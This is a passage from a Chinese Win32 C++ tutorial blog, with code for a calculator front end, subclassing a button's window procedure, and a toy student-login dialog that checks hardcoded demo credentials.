<span class="number">190</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1009</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;0&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">440</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x0011</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;.&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10012</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;+&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10013</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;-&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10014</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;*&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10015</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;/&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10016</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;等于&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">500</span>, <span class="number">350</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10018</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DestroyWindow</span>(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wparam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1011</span>:<span class="comment">//对话框</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1000</span>:<span class="comment">//清空                         //0x51是控件ID</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x51</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1017</span>:<span class="comment">//清空</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x53</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1001</span>:<span class="comment">//数字1</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x83</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1002</span>:<span class="comment">//数字2</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x84</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1003</span>:<span class="comment">//数字3</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x85</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1004</span>:<span class="comment">//数字4</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x86</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1005</span>:<span class="comment">//数字5</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x87</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1006</span>:<span class="comment">//数字6</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x88</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1007</span>:<span class="comment">//数字7</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x89</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1008</span>:<span class="comment">//数字8</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x8A</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1009</span>:<span class="comment">//数字9</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x8B</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0011</span>:<span class="comment">//数字0</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x82</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0012</span>:<span class="comment">//小数点</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x54</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0013</span>:<span class="comment">//运算符 +</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5D</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0014</span>:<span class="comment">//运算符 - </span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5E</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0015</span>:<span class="comment">//运算符 *</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5C</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0016</span>:<span class="comment">//运算符 /</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5B</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0018</span>:<span class="comment">//运算符 =</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x79</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, msg, wparam, lparam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：拦截控件消息"><a href="#题：拦截控件消息" class="headerlink" title="题：拦截控件消息"></a>题：拦截控件消息</h2><p>控件的窗口类，是系统自己注册的，所以，控件的消息处理函数，也是系统自己的。我们如果想要得到控件消息，就需要截获到控件的消息处理函数。</p><p>GetClassLong 能够获取一个已经注册的窗口的类中的属性</p><p>SetClassLong 能够设置一个窗口，对应的窗口类中的属性</p><p>示例：我们使用SetClassLong实现修改按钮的光标</p><h3 id="修改按钮的cursor属性"><a href="#修改按钮的cursor属性" class="headerlink" title="//修改按钮的cursor属性"></a>//修改按钮的cursor属性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HCURSOR hCursor = <span class="built_in">LoadCursor</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDC_CURSOR1));</span><br><span class="line"><span class="built_in">SetClassLong</span>(hButton4, GCL_HCURSOR, (LONG)hCursor);</span><br></pre></td></tr></table></figure><h3 id="修改控件回调"><a href="#修改控件回调" class="headerlink" title="//修改控件回调"></a>//修改控件回调</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">// 旧的窗口回调，</span></span><br><span class="line">WNDPROC g_oldProc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">ButtonProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;你被hook了&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用默认的处理函数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">CallWindowProc</span>(DefWindowProc, hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;按钮1&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1001</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;hook&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1002</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;unhook&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">70</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1003</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1001</span>:</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;我是按钮&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1002</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取按钮1 的句柄</span></span><br><span class="line">HWND hButton1 = <span class="built_in">GetDlgItem</span>(hWnd, <span class="number">0x1001</span>);</span><br><span class="line"><span class="comment">// 替换原本的消息回调</span></span><br><span class="line">g_oldProc =</span><br><span class="line">(WNDPROC)<span class="built_in">SetWindowLong</span>(hButton1, GWL_WNDPROC, (LONG)ButtonProc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1003</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取按钮1 的句柄</span></span><br><span class="line">HWND hButton1 = <span class="built_in">GetDlgItem</span>(hWnd, <span class="number">0x1001</span>);</span><br><span class="line"><span class="comment">// 替换原本的消息回调</span></span><br><span class="line"><span class="built_in">SetWindowLong</span>(hButton1, GWL_WNDPROC, (LONG)g_oldProc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ <span class="type">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.注册窗口类</span></span><br><span class="line">WNDCLASS wc = &#123;&#125;;</span><br><span class="line"><span class="comment">// 窗口回调</span></span><br><span class="line">wc.lpfnWndProc = WndProc;</span><br><span class="line"><span class="comment">// 窗口类名</span></span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;myClass&quot;</span>;</span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.创建窗口</span></span><br><span class="line">HWND hWnd = <span class="built_in">CreateWindow</span>(<span class="string">L&quot;myClass&quot;</span>, <span class="string">L&quot;我的窗口&quot;</span>, WS_OVERLAPPEDWINDOW,</span><br><span class="line"><span class="number">40</span>, <span class="number">40</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.更新显示窗口</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hWnd);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.建立消息循环</span></span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：校园学生登录"><a href="#题：校园学生登录" class="headerlink" title="题：校园学生登录"></a>题：校园学生登录</h2><p>里面有图片控件是直接在可视化界面导入的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;comdef.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Commctrl.h&gt;</span><span class="comment">//通用控件必备头</span></span></span><br><span class="line"><span class="comment">//全局的实例句柄</span></span><br><span class="line"><span class="type">static</span> HINSTANCE g_hInstance;</span><br><span class="line"><span class="comment">//全局的父窗口句柄</span></span><br><span class="line">HWND g_hDlg;</span><br><span class="line"><span class="comment">//非模态回调</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="comment">//手动回调</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndPorc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE lProInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hInstance = hInstance;</span><br><span class="line">HWND hDlg=<span class="built_in">CreateDialog</span>(hInstance,<span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG1),<span class="literal">NULL</span>, DlgProc);</span><br><span class="line">g_hDlg = hDlg;</span><br><span class="line"><span class="built_in">ShowWindow</span>(hDlg,SW_SHOW);</span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//回调</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd,UINT Message,WPARAM wParam,LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (Message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IDOK2:<span class="comment">//登录控件</span></span><br><span class="line">&#123;</span><br><span class="line">HWND hBt = <span class="built_in">GetDlgItem</span>(hWnd, IDOK2);</span><br><span class="line"><span class="comment">//SendMessage(hBt, BM_GETCHECK,0,0);</span></span><br><span class="line"><span class="comment">//MessageBox(hBt,L&quot;无法连接服务器&quot;,L&quot;提示&quot;,1);</span></span><br><span class="line"><span class="comment">//获取文本框句柄</span></span><br><span class="line">HWND hedit_user = <span class="built_in">GetDlgItem</span>(hWnd, IDC_EDIT3);</span><br><span class="line">HWND hedit_passwd = <span class="built_in">GetDlgItem</span>(hWnd, IDC_EDIT2);</span><br><span class="line"><span class="comment">//定义文本框获取缓冲区</span></span><br><span class="line">WCHAR c_User[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">WCHAR c_Passwd[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//获取编辑框中是文本</span></span><br><span class="line"><span class="built_in">GetWindowText</span>(hedit_user, c_User,<span class="number">20</span>);</span><br><span class="line"><span class="built_in">GetWindowText</span>(hedit_passwd, c_Passwd, <span class="number">20</span>);</span><br><span class="line">WCHAR C_MAX[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//将用户名转换成char*用于使用strcmp函数的比较</span></span><br><span class="line"><span class="function"><span class="type">_bstr_t</span> <span class="title">c_UTemp</span><span class="params">(c_User)</span></span>;<span class="comment">//将WHCHAR* 转换位char*</span></span><br><span class="line"><span class="function"><span class="type">_bstr_t</span> <span class="title">c_PTemp</span><span class="params">(c_Passwd)</span></span>;<span class="comment">//将WHCHAR* 转换位char*</span></span><br><span class="line"><span class="comment">//设置一个可以登录的用户名或密码</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* u_temp = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* p_temp = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//int i = strcmp(c_UTemp, u_temp);</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">strcmp</span>(c_UTemp, u_temp)==<span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(c_PTemp, p_temp)==<span class="number">0</span>))<span class="comment">//等于0说明账户名和密码都相等，验证成功</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd,SW_HIDE);<span class="comment">//隐藏主窗口</span></span><br><span class="line"></span><br><span class="line">HWND hMain = <span class="built_in">CreateDialog</span>(g_hInstance,<span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG2) ,g_hDlg, DlgProc);</span><br><span class="line"><span class="comment">//初始化界面</span></span><br><span class="line"><span class="comment">//1,初始化图片</span></span><br><span 